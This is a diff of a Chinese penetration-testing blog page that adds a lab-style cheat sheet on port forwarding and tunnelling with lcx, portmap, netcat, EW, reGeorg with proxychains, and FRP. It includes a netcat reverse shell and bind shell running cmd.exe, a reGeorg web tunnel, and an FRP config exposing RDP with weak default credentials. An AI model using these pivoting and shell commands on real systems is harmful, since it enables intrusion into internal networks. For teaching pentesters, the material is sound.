@@ -6,15 +6,13 @@
   <meta name="keywords" content="">
   <meta name="description" content="端口转发与隧道 | Laosec@Falao">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://example.com/categories/index.html">
 <meta property="og:site_name" content="Laosec@Falao">
-<meta property="og:description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-01-15T05:05:54.000Z">
-<meta property="article:modified_time" content="2021-01-15T05:07:45.429Z">
+<meta property="article:published_time" content="2021-01-15T10:01:12.000Z">
+<meta property="article:modified_time" content="2021-01-15T10:01:12.093Z">
 <meta property="article:author" content="法老">
 <meta name="twitter:card" content="summary">
 
@@ -347,7 +345,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-21 13:59:59'>2021-01-21 13:59</time>
+            Created At : <time class="date" title='Updated At: 2021-01-22 16:13:47'>2021-01-21 13:59</time>
         
     </div>
     <div class="article-meta">
@@ -369,7 +367,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C1%EF%BC%9ALCX%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">实验1：LCX端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%95%E9%AA%8C%E4%BA%8C%EF%BC%9APORTMAP%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">试验二：PORTMAP端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9ANC%E5%8F%8D%E5%BC%B9"><span class="toc-text">实验三：NC反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%9B%9B%EF%BC%9AEW%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">实验四：EW工具使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%94%EF%BC%9AreGeorg-Proxychains"><span class="toc-text">实验五：reGeorg+Proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C"><span class="toc-text">步骤一：服务器操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%93%8D%E4%BD%9C"><span class="toc-text">步骤二：客户端操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9AProxychains%E9%85%8D%E7%BD%AE"><span class="toc-text">步骤三：Proxychains配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%EF%BC%9A%E9%AA%8C%E8%AF%81%E9%85%8D%E7%BD%AE"><span class="toc-text">步骤四：验证配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%85%AD%EF%BC%9AFRP%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-text">实验六：FRP内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%85%AC%E7%BD%91%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-text">步骤一：公网主机配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-text">步骤二：内网主机配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E9%85%8D%E7%BD%AE%E9%AA%8C%E8%AF%81"><span class="toc-text">步骤三：配置验证</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -385,7 +383,122 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="实验1：LCX端口转发"><a href="#实验1：LCX端口转发" class="headerlink" title="实验1：LCX端口转发"></a>实验1：LCX端口转发</h3><ul>
+<li>正向转发</li>
+</ul>
+<blockquote>
+<p>内网主机执行：lcx.exe –slave 公网主机IP 公网主机端口 内网主机IP 内网主机端口</p>
+</blockquote>
+<blockquote>
+<p>外网主机执行：Lcx.exe –listen 公网主机端口1 公网主机端口2</p>
+</blockquote>
+<ul>
+<li>反向转发</li>
+</ul>
+<blockquote>
+<p>外网主机执行：Lcx.exe -tran 53 目标主机IP 3389</p>
+</blockquote>
+<h3 id="试验二：PORTMAP端口转发"><a href="#试验二：PORTMAP端口转发" class="headerlink" title="试验二：PORTMAP端口转发"></a>试验二：PORTMAP端口转发</h3><ul>
+<li>正向转发</li>
+</ul>
+<blockquote>
+<p>内网主机执行：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 6666</p>
+<p>外网主机执行：./portmap -m 2 -p1 6666 -h2 公网主机ip -p2 7777</p>
+</blockquote>
+<ul>
+<li>反向转发</li>
+</ul>
+<blockquote>
+<p>外网主机执行：./portmap -m1 -p1 6666 -h2 目标主机IP -p2 22</p>
+</blockquote>
+<h3 id="实验三：NC反弹"><a href="#实验三：NC反弹" class="headerlink" title="实验三：NC反弹"></a>实验三：NC反弹</h3><ul>
+<li>反向连接</li>
+</ul>
+<blockquote>
+<p>在公网主机进行监听：nc -lvp 4444</p>
+<p>在内网主机执行：nc -t -e cmd.exe 公网主机IP 4444</p>
+</blockquote>
+<ul>
+<li>正向连接</li>
+</ul>
+<blockquote>
+<p>远程主机执行：nc -l -p 4444 -t -e cmd.exe</p>
+<p>攻击主机执行：nc -vv 远程主机IP 4444</p>
+</blockquote>
+<h3 id="实验四：EW工具使用"><a href="#实验四：EW工具使用" class="headerlink" title="实验四：EW工具使用"></a>实验四：EW工具使用</h3><ul>
+<li><p>端口转发</p>
+</li>
+<li><ul>
+<li><p>反向转发</p>
+<blockquote>
+<p>./ew_for_Linux64 -s lcx_tran -l 1080 -f 内网主机IP -g 3389</p>
+</blockquote>
+</li>
+<li><p>正向转发</p>
+<blockquote>
+<p>公网执行：ew -s lcx_listen -l 1080 -e 8080<br>内网执行：ew -s lcx_slave -d 192.168.0.31 -e 8080 -f 192.168.5.101 -g 22</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>流量转发</p>
+</li>
+<li><ul>
+<li><p>正向代理</p>
+<blockquote>
+<p>ew -s ssocksd -l 8888      开启 8888端口的socks 代理</p>
+</blockquote>
+</li>
+<li><p>反向代理</p>
+<blockquote>
+<p>1.在公网服务器上执行以下命令:<br>ew -s rcsocks -l 1080 -e 1024       监听本机的1080端口转发到反连1024端口的主机<br>2在目标机器执行以下命令:<br>ew -s rssocks -d 公网IP -e 1024             通过socks隧道连接公网IP的1024端口</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="实验五：reGeorg-Proxychains"><a href="#实验五：reGeorg-Proxychains" class="headerlink" title="实验五：reGeorg+Proxychains"></a>实验五：reGeorg+Proxychains</h3><h4 id="步骤一：服务器操作"><a href="#步骤一：服务器操作" class="headerlink" title="步骤一：服务器操作"></a>步骤一：服务器操作</h4><blockquote>
+<p>yum -y install httpd php</p>
+<p>Tunnel.nosockets.php—&gt;/var/www/html</p>
+</blockquote>
+<h4 id="步骤二：客户端操作"><a href="#步骤二：客户端操作" class="headerlink" title="步骤二：客户端操作"></a>步骤二：客户端操作</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="http://81.70.149.131/tunnelnos.php">http://81.70.149.131/tunnelnos.php</a></p>
+<p>回显内容：Georg says, ‘All seems fine’</p>
+</blockquote>
+<blockquote>
+<p>python2 reGeorgSocksProxy.py -p 8080 -u  <a target="_blank" rel="noopener" href="http://81.70.149.131/tunnelnos.php">http://81.70.149.131/tunnelnos.php</a></p>
+</blockquote>
+<h4 id="步骤三：Proxychains配置"><a href="#步骤三：Proxychains配置" class="headerlink" title="步骤三：Proxychains配置"></a>步骤三：Proxychains配置</h4><blockquote>
+<p>vi /etc/proxychains4.conf</p>
+<p>52 #proxy_dns</p>
+<p>115 socks5 127.0.0.1 8080</p>
+</blockquote>
+<h4 id="步骤四：验证配置"><a href="#步骤四：验证配置" class="headerlink" title="步骤四：验证配置"></a>步骤四：验证配置</h4><blockquote>
+<p>proxychains curl <a target="_blank" rel="noopener" href="http://10.0.8.12/">http://10.0.8.12/</a></p>
+<p>proxychains msfconsole</p>
+</blockquote>
+<h3 id="实验六：FRP内网穿透"><a href="#实验六：FRP内网穿透" class="headerlink" title="实验六：FRP内网穿透"></a>实验六：FRP内网穿透</h3><h4 id="步骤一：公网主机配置"><a href="#步骤一：公网主机配置" class="headerlink" title="步骤一：公网主机配置"></a>步骤一：公网主机配置</h4><blockquote>
+<p>#frps.ini文件内容配置如下</p>
+<p>[common]<br>bind_addr=0.0.0.0<br>bind_port = 7000</p>
+<p>authenticate_heartbeats = true<br>authenticate_new_work_conns = true<br>authentication_method = token<br>token = ‘123456’</p>
+<p>dashboard_port = 7500<br>dashboard_user = admin<br>dashboard_pwd = admin888</p>
+</blockquote>
+<blockquote>
+<p>./frps -c frps.ini          #启动服务端</p>
+<p>http://公网IP:7500/   #登录WEB控制端</p>
+</blockquote>
+<h4 id="步骤二：内网主机配置"><a href="#步骤二：内网主机配置" class="headerlink" title="步骤二：内网主机配置"></a>步骤二：内网主机配置</h4><blockquote>
+<p>#frpc.ini文件内容如下</p>
+<p>[common]<br>server_addr = 1.1.1.1<br>server_port = 7000<br>authenticate_heartbeats = true<br>authenticate_new_work_conns = true<br>authentication_method = token<br>token = ‘123456’</p>
+<p>[rdp]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 3389<br>remote_port = 6000</p>
+</blockquote>
+<blockquote>
+<p>frpc.exe -c frpc.ini   #客户端与服务端建立连接</p>
+</blockquote>
+<h4 id="步骤三：配置验证"><a href="#步骤三：配置验证" class="headerlink" title="步骤三：配置验证"></a>步骤三：配置验证</h4><blockquote>
+<p>mstsc 1.1.1.1:6000   #进行内网主机RDP登录</p>
+</blockquote>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
     </div>
